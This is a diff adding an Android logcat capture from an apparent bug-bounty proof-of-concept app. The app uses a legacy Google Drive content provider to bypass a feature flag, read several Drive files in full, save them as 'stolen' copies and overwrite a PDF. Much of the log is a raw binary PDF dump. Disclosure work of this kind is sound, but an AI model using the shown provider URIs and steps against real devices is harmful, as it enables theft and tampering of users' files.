@@ -1,0 +1,771 @@
+--------- beginning of main
+07-10 06:34:18.583  8730  8730 D VRP_POC : === VRP PoC - Untrusted App Context ===
+07-10 06:34:18.583  8730  8730 D VRP_POC : UID: 10341
+07-10 06:34:18.583  8730  8730 D VRP_POC : PID: 8730
+07-10 06:34:18.584  8730  8730 D VRP_POC : Package: com.vrppoc
+07-10 06:34:18.584  8730  8730 D VRP_POC : 
+07-10 06:34:18.584  8730  8730 D VRP_POC : --- Drive SAF Provider (direct, no picker) ---
+07-10 06:34:18.584  8730  8730 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/root: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 06:34:18.584  8730  8730 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/document/acc%3D1%3B0: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 06:34:18.585  8730  8730 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/document/acc%3D1%3B0/children: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 06:34:18.585  8730  8730 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/document/acc%3D1%3Bview%3Dmydrive/children: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 06:34:18.585  8730  8730 D VRP_POC :   Attempting file read via SAF...
+07-10 06:34:18.585  8730  8730 D VRP_POC : [BLOCKED] SAF file read: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 06:34:18.585  8730  8730 D VRP_POC : --- Drive LegacyStorageBackendContentProvider ---
+07-10 06:34:18.585  8730  8730 D VRP_POC :   Test 1: Feature flag bypass (invalid doc)...
+07-10 06:34:18.606  8730  8730 D VRP_POC : [BYPASS] Feature flag DISABLED - no SecurityException for openFile
+07-10 06:34:18.607  8730  8730 D VRP_POC :   Test 2: Reading real Drive files...
+07-10 06:34:18.607  8730  8730 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=
+07-10 06:34:18.638  8730  8730 D VRP_POC : [VULN-QUERY] Web portal 1.xlsx: _id=acc=1;doc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=, document_id=acc=1;doc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=, _display_name=Web portal 1-IV YEAR CSE B- final.xlsx, _size=25, mime_type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, flags=455, last_modified=1783644106083, icon=null, content_sync_state_flags=1
+07-10 06:34:18.654  8730  8730 D VRP_POC : [VULN-READ] Web portal 1.xlsx: 25 bytes FULL FILE!
+07-10 06:34:18.654  8730  8730 D VRP_POC :   First32: 41545441434b45525f4d4f4449464945445f434f4e54454e54
+07-10 06:34:18.654  8730  8730 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Web_portal_1.xlsx
+07-10 06:34:18.654  8730  8730 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=
+07-10 06:34:18.660  8730  8730 D VRP_POC : [VULN-QUERY] Web portal 4.xlsx: _id=acc=1;doc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=, document_id=acc=1;doc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=, _display_name=Web portal 4-IV  YEAR CSE B.xlsx, _size=39289, mime_type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, flags=455, last_modified=1666962930000, icon=null, content_sync_state_flags=1
+07-10 06:34:18.667  8730  8730 D VRP_POC : [VULN-READ] Web portal 4.xlsx: 39289 bytes FULL FILE!
+07-10 06:34:18.667  8730  8730 D VRP_POC :   First32: 504b0304140008080800ee315c5500000000000000000000000018000000786c
+07-10 06:34:18.668  8730  8730 D VRP_POC :   TYPE: ZIP/OOXML file!
+07-10 06:34:18.668  8730  8730 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Web_portal_4.xlsx
+07-10 06:34:18.668  8730  8730 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=sOhlwv_Lizop4BVKjzA7YBjTmv6JBCHk3jOtchzefrzcMpRy8SXNJpw=
+07-10 06:34:18.674  8730  8730 D VRP_POC : [VULN-QUERY] Untitled presentation.pdf: _id=acc=1;doc=encoded=sOhlwv_Lizop4BVKjzA7YBjTmv6JBCHk3jOtchzefrzcMpRy8SXNJpw=, document_id=acc=1;doc=encoded=sOhlwv_Lizop4BVKjzA7YBjTmv6JBCHk3jOtchzefrzcMpRy8SXNJpw=, _display_name=Untitled presentation.pdf, _size=3756, mime_type=application/pdf, flags=389, last_modified=1731864451414, icon=null, content_sync_state_flags=0
+07-10 06:34:18.683  8730  8730 D VRP_POC : [VULN-READ] Untitled presentation.pdf: 17584 bytes FULL FILE!
+07-10 06:34:18.683  8730  8730 D VRP_POC :   First32: 255044462d312e340a2520e2e3cfd30a330a300a6f626a0a3c3c0a2f54797065
+07-10 06:34:18.683  8730  8730 D VRP_POC :   TYPE: PDF!
+07-10 06:34:18.683  8730  8730 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Untitled_presentation.pdf
+07-10 06:34:18.683  8730  8730 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=nTgJt0L-kab4R1TMBylupt7LFk6Kuy980j-ZF7zQ_yxGW-HVF2xFUms=
+07-10 06:34:18.688  8730  8730 D VRP_POC : [VULN-QUERY] Prompt injection doc.pdf: _id=acc=1;doc=encoded=nTgJt0L-kab4R1TMBylupt7LFk6Kuy980j-ZF7zQ_yxGW-HVF2xFUms=, document_id=acc=1;doc=encoded=nTgJt0L-kab4R1TMBylupt7LFk6Kuy980j-ZF7zQ_yxGW-HVF2xFUms=, _display_name=Write the detail documentation on prompt injection vulnerability.pdf, _size=2723, mime_type=application/pdf, flags=389, last_modified=1684743004735, icon=null, content_sync_state_flags=0
+07-10 06:34:18.696  8730  8730 D VRP_POC : [VULN-READ] Prompt injection doc.pdf: 35844 bytes FULL FILE!
+07-10 06:34:18.696  8730  8730 D VRP_POC :   First32: 255044462d312e340a25d3ebe9e10a312030206f626a0a3c3c2f5469746c6520
+07-10 06:34:18.696  8730  8730 D VRP_POC :   TYPE: PDF!
+07-10 06:34:18.697  8730  8730 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Prompt_injection_doc.pdf
+07-10 06:34:18.697  8730  8730 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=SxJ0EnldYtpb1gQTwsdSVeQx0dMzJL8QdOGEspDNYqHCPYYhdHmKNAg=
+07-10 06:34:18.701  8730  8730 D VRP_POC : [VULN-QUERY] websiteregister.pdf: _id=acc=1;doc=encoded=SxJ0EnldYtpb1gQTwsdSVeQx0dMzJL8QdOGEspDNYqHCPYYhdHmKNAg=, document_id=acc=1;doc=encoded=SxJ0EnldYtpb1gQTwsdSVeQx0dMzJL8QdOGEspDNYqHCPYYhdHmKNAg=, _display_name=websiteregister-rijksoverheid-2024-05-30.pdf, _size=72356, mime_type=application/pdf, flags=389, last_modified=1720015354639, icon=null, content_sync_state_flags=32
+07-10 06:34:18.715  8730  8730 D VRP_POC : [VULN-READ] websiteregister.pdf: 945500 bytes FULL FILE!
+07-10 06:34:18.715  8730  8730 D VRP_POC :   First32: 255044462d312e340a2520e2e3cfd30a330a300a6f626a0a3c3c0a2f54797065
+07-10 06:34:18.715  8730  8730 D VRP_POC :   TYPE: PDF!
+07-10 06:34:18.717  8730  8730 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_websiteregister.pdf
+07-10 06:34:18.717  8730  8730 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=dtV9zLfk3_l2GJLdmisj8hHl_D8AxWol9OaXsV9DQvnPSswTyCHbxPc=
+07-10 06:34:18.721  8730  8730 D VRP_POC : [VULN-QUERY] bug bounty folder: _id=acc=1;doc=encoded=dtV9zLfk3_l2GJLdmisj8hHl_D8AxWol9OaXsV9DQvnPSswTyCHbxPc=, document_id=acc=1;doc=encoded=dtV9zLfk3_l2GJLdmisj8hHl_D8AxWol9OaXsV9DQvnPSswTyCHbxPc=, _display_name=bug bounty , _size=null, mime_type=vnd.android.document/directory, flags=262476, last_modified=1708586208781, icon=null, content_sync_state_flags=0
+07-10 06:34:18.724  8730  8730 D VRP_POC : [NOFILE] Read bug bounty folder (provider accessible, doc not cached)
+07-10 06:34:18.724  8730  8730 D VRP_POC :   Test 3: openTypedAssetFile...
+07-10 06:34:18.729  8730  8730 D VRP_POC : [VULN] Legacy openTypedAssetFile: accessible!
+07-10 06:34:18.729  8730  8730 D VRP_POC :   Test 4: Write access to Drive files...
+07-10 06:34:18.732  8730  8730 D VRP_POC : [WRITE-PRE] Original size of Untitled presentation.pdf: 3756 bytes
+07-10 06:34:18.735  8730  8730 D VRP_POC : [VULN-WRITE] WRITE SUCCEEDED on Untitled presentation.pdf! Integrity compromised!
+07-10 06:34:18.735  8730  8730 D VRP_POC : [VULN-WRITE] Wrote 42 bytes: ATTACKER_OVERWROTE_THIS_FILE_1783645458729
+07-10 06:34:18.744  8730  8730 D VRP_POC : [VULN-VERIFY] Read back 16789 bytes: %PDF-1.4
+07-10 06:34:18.744  8730  8730 D VRP_POC : % ����
+07-10 06:34:18.744  8730  8730 D VRP_POC : 3
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Catalog
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Names
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /PageLabels
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Nums
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /S
+07-10 06:34:18.744  8730  8730 D VRP_POC : /D
+07-10 06:34:18.744  8730  8730 D VRP_POC : /St
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Outlines
+07-10 06:34:18.744  8730  8730 D VRP_POC : 2
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Pages
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 4
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Creator
+07-10 06:34:18.744  8730  8730 D VRP_POC : (����G��o��o��g��l��e)
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Title
+07-10 06:34:18.744  8730  8730 D VRP_POC : (����U��n��t��i��t��l��e��d�� ��p��r��e��s��e��n��t��a��t��i��o��n)
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 5
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Page
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Parent
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /MediaBox
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 720
+07-10 06:34:18.744  8730  8730 D VRP_POC : 405
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Contents
+07-10 06:34:18.744  8730  8730 D VRP_POC : 6
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Resources
+07-10 06:34:18.744  8730  8730 D VRP_POC : 7
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Annots
+07-10 06:34:18.744  8730  8730 D VRP_POC : 9
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Group
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /S
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Transparency
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CS
+07-10 06:34:18.744  8730  8730 D VRP_POC : /DeviceRGB
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 6
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Filter
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FlateDecode
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Length
+07-10 06:34:18.744  8730  8730 D VRP_POC : 8
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : stream
+07-10 06:34:18.744  8730  8730 D VRP_POC : x���M
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1��9�`M��.=�+�"8�����ig�l	m��佦�����K�NP"�<�ޱ����	8�������k����#��.&��/ë��s��_�#�vp��J�����Ȓu!f6�Ħ�x��^PY�;[G\,��jĲ��T�(�<��L���l�m0W
+07-10 06:34:18.744  8730  8730 D VRP_POC : endstream
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 8
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 173
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 9
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 10
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CA
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1.0
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ca
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1.0
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 11
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CA
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ca
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 7
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Font
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Pattern
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /XObject
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ExtGState
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Alpha0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 10
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Alpha1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 11
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ProcSet
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : /PDF
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Text
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageB
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageC
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageI
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 12
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Page
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Parent
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /MediaBox
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 720
+07-10 06:34:18.744  8730  8730 D VRP_POC : 405
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Contents
+07-10 06:34:18.744  8730  8730 D VRP_POC : 13
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Resources
+07-10 06:34:18.744  8730  8730 D VRP_POC : 14
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Annots
+07-10 06:34:18.744  8730  8730 D VRP_POC : 16
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Group
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /S
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Transparency
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CS
+07-10 06:34:18.744  8730  8730 D VRP_POC : /DeviceRGB
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 13
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Filter
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FlateDecode
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Length
+07-10 06:34:18.744  8730  8730 D VRP_POC : 15
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : stream
+07-10 06:34:18.744  8730  8730 D VRP_POC : x��S�N�0�y�� �׻v|�8�gj+�R��Nk��"�T���3Ό݂5y�,F��8�� ��kA�Vlֺ(�8/�c���B	��6����=̕���i�:}@��ug)s1�	}
+07-10 06:34:18.744  8730  8730 D VRP_POC : �c����m_���Zb_g�PcfR
+07-10 06:34:18.744  8730  8730 D VRP_POC : qi�j�c�صʾ��I��\]��N�R���b��^��+���Βƴ�������9�!��]��l�� -mHOpXauW�T��yuu�.�ߐ-y#��m��	3�V��h��~��7N��ם,����� �f��/-�����w�8�Bߤ_�#V�m�)�����jqoD��p�ʷo��m�~����cq�
+07-10 06:34:18.744  8730  8730 D VRP_POC : endstream
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 15
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 329
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 16
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 14
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Font
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Font2
+07-10 06:34:18.744  8730  8730 D VRP_POC : 17
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Pattern
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /XObject
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ExtGState
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Alpha0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 10
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Alpha1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 11
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ProcSet
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : /PDF
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Text
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageB
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageC
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageI
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 18
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Page
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Parent
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /MediaBox
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 720
+07-10 06:34:18.744  8730  8730 D VRP_POC : 405
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Contents
+07-10 06:34:18.744  8730  8730 D VRP_POC : 19
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Resources
+07-10 06:34:18.744  8730  8730 D VRP_POC : 20
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Annots
+07-10 06:34:18.744  8730  8730 D VRP_POC : 22
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Group
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /S
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Transparency
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CS
+07-10 06:34:18.744  8730  8730 D VRP_POC : /DeviceRGB
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 19
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Filter
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FlateDecode
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Length
+07-10 06:34:18.744  8730  8730 D VRP_POC : 21
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
